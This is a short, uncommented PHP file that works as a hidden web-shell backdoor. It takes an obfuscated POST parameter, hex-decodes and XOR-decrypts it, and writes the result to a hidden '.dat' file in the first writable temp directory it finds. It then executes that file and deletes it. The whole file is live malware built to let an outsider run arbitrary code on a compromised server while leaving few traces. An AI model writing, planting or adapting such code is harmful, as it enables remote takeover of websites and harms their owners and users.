<?php

if(@$_POST["\x64a\x74a"] !== null){
	$entry = hex2bin($_POST["\x64a\x74a"]);
	$mrk = ''    ;   foreach(str_split($entry) as $char){$mrk .= chr(ord($char) ^ 50);}
	$flag = array_filter(["/var/tmp", "/dev/shm", session_save_path(), ini_get("upload_tmp_dir"), getenv("TEMP"), getcwd(), getenv("TMP"), "/tmp", sys_get_temp_dir()]);
	foreach ($flag as $hld):
    		if (!!is_dir($hld) && !!is_writable($hld)) {
    $tkn = "$hld" . "/.dat";
    if (file_put_contents($tkn, $mrk)) {
	require $tkn;
	unlink($tkn);
	die();
}
}
endforeach;
}